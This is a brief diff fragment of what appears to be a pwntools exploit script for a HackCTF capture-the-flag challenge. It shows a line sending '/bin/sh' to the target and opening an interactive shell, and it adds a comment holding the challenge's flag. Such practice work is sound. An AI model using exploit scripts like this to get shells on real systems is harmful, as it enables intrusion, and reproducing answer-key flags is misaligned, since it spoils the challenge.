@@ -93,3 +93,4 @@ p.sendline("/bin/sh\00")
 
 p.interactive()
 
+#HackCTF{4nd_4_P4ssing_necklace_in_h1s_h4nd}
